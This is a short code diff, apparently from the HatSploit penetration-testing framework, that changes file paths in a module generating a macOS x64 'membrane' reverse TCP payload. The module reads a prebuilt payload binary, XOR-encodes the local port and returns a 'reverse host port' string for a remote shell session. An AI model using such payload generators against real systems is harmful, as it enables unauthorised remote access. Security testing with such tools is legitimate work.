@@ -29,7 +29,7 @@ from core.lib.payload import Payload
 from utils.string.string import StringTools
 from utils.tcp.tcp import TCPClient
 
-from data.payloads.macos.x64.membrane_reverse_tcp.session import HatSploitSession
+from data.membrane.macos.session import HatSploitSession
 
 
 class HatSploitPayload(Payload, HatVenom, StringTools, TCPClient):
@@ -75,7 +75,7 @@ class HatSploitPayload(Payload, HatVenom, StringTools, TCPClient):
         local_port = self.xor_string(local_port)
 
         self.output_process("Generating payload...")
-        with open('data/payloads/macos/x64/membrane_reverse_tcp/membrane.bin', 'rb') as f:
+        with open('data/membrane/macos/x64/membrane.bin', 'rb') as f:
             payload = f.read()
 
         return payload, f"reverse {local_host} {local_port}", HatSploitSession
